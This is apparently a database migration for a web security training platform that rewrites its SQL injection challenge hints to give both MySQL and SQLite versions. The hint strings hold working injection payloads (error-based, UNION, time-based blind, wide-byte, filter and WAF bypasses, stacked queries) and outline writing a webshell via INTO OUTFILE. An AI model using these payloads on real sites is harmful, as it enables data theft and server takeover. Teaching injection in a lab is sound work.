-- ============================================================
-- 迁移 010：SQL 注入关卡提示双驱动化（存量部署执行一次即可）
--
-- 背景：部分 SQL 注入手法是 MySQL 专属（extractvalue/updatexml
-- 报错取数、SLEEP 时间盲注、INTO OUTFILE GetShell、GBK 宽字节、
-- /*!...*/ 内联注释拼接），SQLite 本地模式下提示若只写 MySQL
-- payload 会误导学习者。本迁移将相关 hints 行与 challenges
-- 描述更新为「MySQL/SQLite 双驱动双写」文案。
--
-- 与 tools/generate_hints.php、database/init/03_hints.sql、
-- database/seeds/02_challenges.sql 保持一致：
--   - 全新部署走 init/02+03 全量导入，无需本迁移；
--   - 已初始化的环境执行本迁移即可。
--
-- 说明：本迁移为幂等 UPDATE（按文案精确匹配），可重复执行；
-- 新增迁移说明见 docs/INSTALL.md「SQLite 模式下注入关卡教学差异」。
-- ============================================================

-- WM-LQ-09 / LH-JZ-06（sqli_error 报错注入）
UPDATE `hints` SET `content` = '报错取数：MySQL 用 extractvalue()/updatexml() 触发报错回显；SQLite 无等价函数（MySQL 专属手法）'
WHERE `challenge_id` IN ('WM-LQ-09', 'LH-JZ-06') AND `level` = 2;
UPDATE `hints` SET `content` = 'Payload (MySQL): ?id=1'' AND extractvalue(1,concat(0x7e,version()))-- -；SQLite 下可提交 1'' 观察报错回显与后端数据库指纹'
WHERE `challenge_id` IN ('WM-LQ-09', 'LH-JZ-06') AND `level` = 3;

-- LH-JZ-05（sqli_union 联合注入）
UPDATE `hints` SET `content` = '使用 UNION SELECT 拼接新查询；查系统表 MySQL 用 information_schema，SQLite 用 sqlite_master'
WHERE `challenge_id` = 'LH-JZ-05' AND `level` = 2;
UPDATE `hints` SET `content` = 'Payload: ?id=1'' UNION SELECT 1,version(),3-- -（SQLite 用 sqlite_version()）'
WHERE `challenge_id` = 'LH-JZ-05' AND `level` = 3;

-- WM-JZ-08（sqli_time 时间盲注）
UPDATE `hints` SET `content` = 'MySQL 用 SLEEP() 制造延迟；SQLite 无 SLEEP()，用重型递归 CTE 消耗 CPU 制造延迟'
WHERE `challenge_id` = 'WM-JZ-08' AND `level` = 2;
UPDATE `hints` SET `content` = 'Payload (MySQL): ?name=admin'' AND IF(1=1,SLEEP(5),0)-- -；Payload (SQLite): ?name=admin'' AND (SELECT count(*) FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c LIMIT 20000000) SELECT x FROM c))>0-- -'
WHERE `challenge_id` = 'WM-JZ-08' AND `level` = 3;

-- LH-JD-05（sqli_gbk 宽字节）
UPDATE `hints` SET `content` = '数据库使用 GBK 编码（宽字节为 MySQL 专属特性，SQLite 恒为 UTF-8）'
WHERE `challenge_id` = 'LH-JD-05' AND `level` = 1;
UPDATE `hints` SET `content` = 'MySQL GBK 下宽字节 (%bf%27) 可吃掉 addslashes 的反斜杠；SQLite 中反斜杠不是转义符，addslashes 完全不防注入'
WHERE `challenge_id` = 'LH-JD-05' AND `level` = 2;
UPDATE `hints` SET `content` = 'Payload (MySQL): ?id=%bf%27 OR 1=1-- -；Payload (SQLite): ?id=1'' OR 1=1-- -'
WHERE `challenge_id` = 'LH-JD-05' AND `level` = 3;

-- WM-JD-07（sqli_filter 过滤绕过）
UPDATE `hints` SET `content` = '双写绕过（ununionion selselectect）双驱动通用；内联注释拼接（uni/**/on）利用 MySQL 词法特性，SQLite 不可用'
WHERE `challenge_id` = 'WM-JD-07' AND `level` = 2;
UPDATE `hints` SET `content` = 'Payload: ?id=-1 ununionion selselectect 1-- -（UNION 列数需与主查询一致）'
WHERE `challenge_id` = 'WM-JD-07' AND `level` = 3;

-- WM-JD-08（sqli_waf WAF 绕过）
UPDATE `hints` SET `content` = 'MySQL 用内联注释拼接（uni/**/on）绕过；SQLite 将注释视为空白，可用黑名单未拦的恒真式（OR 1=1）绕过'
WHERE `challenge_id` = 'WM-JD-08' AND `level` = 2;
UPDATE `hints` SET `content` = 'Payload (MySQL): ?id=-1 uni/**/on sel/**/ect version()-- -；Payload (SQLite): ?id=1 OR 1=1-- -'
WHERE `challenge_id` = 'WM-JD-08' AND `level` = 3;

-- QY-LX-07（sqli_multi 多语句）
UPDATE `hints` SET `content` = '演示环境以 PDO 多语句模拟（原 mysqli_multi_query）'
WHERE `challenge_id` = 'QY-LX-07' AND `level` = 1;

-- WM-LX-03（sqli_getshell）
UPDATE `hints` SET `content` = '通过 SQL 注入写入 WebShell（INTO OUTFILE 为 MySQL 专属，需 FILE 权限；SQLite 无等价手法）'
WHERE `challenge_id` = 'WM-LX-03' AND `level` = 1;
UPDATE `hints` SET `content` = 'MySQL 用 INTO OUTFILE 写 PHP 文件到 web 目录；SQLite 可拓展了解 ATTACH DATABASE 写文件思路'
WHERE `challenge_id` = 'WM-LX-03' AND `level` = 2;

-- QY-HT-03（sqli_comprehensive 综合）
UPDATE `hints` SET `content` = '从 UNION 注入到 GetShell 完整链路（GetShell 依赖 MySQL FILE 权限，SQLite 无等价）'
WHERE `challenge_id` = 'QY-HT-03' AND `level` = 2;
UPDATE `hints` SET `content` = 'Payload (MySQL): UNION 注入获取数据库路径 → INTO OUTFILE 写入 WebShell；SQLite 下仅可练习数据提取'
WHERE `challenge_id` = 'QY-HT-03' AND `level` = 3;

-- 关卡详情页描述同步
UPDATE `challenges` SET `description` = '报错注入 extractvalue/updatexml（MySQL 专属，SQLite 无等价函数）。Payload: 1'' AND extractvalue(1,concat(0x7e,version()))-- -'
WHERE `id` = 'LH-JZ-06';
UPDATE `challenges` SET `description` = '时间盲注。Payload: 1'' AND SLEEP(5)-- -（SQLite 无 SLEEP()，用重型递归 CTE 制造延迟）'
WHERE `id` = 'WM-JZ-08';
UPDATE `challenges` SET `description` = '堆叠注入。Payload: 1''; SELECT * FROM demo_users-- -'
WHERE `id` = 'LH-JD-04';
UPDATE `challenges` SET `description` = '宽字节注入（MySQL 专属，SQLite 恒为 UTF-8 且 addslashes 不防注入）。Payload (MySQL): 1%bf%27 OR 1=1-- -；Payload (SQLite): 1'' OR 1=1-- -'
WHERE `id` = 'LH-JD-05';
UPDATE `challenges` SET `description` = 'SQL 注入 INTO OUTFILE/GetShell（MySQL 专属，需 FILE 权限；SQLite 无等价手法）。'
WHERE `id` = 'WM-LX-03';
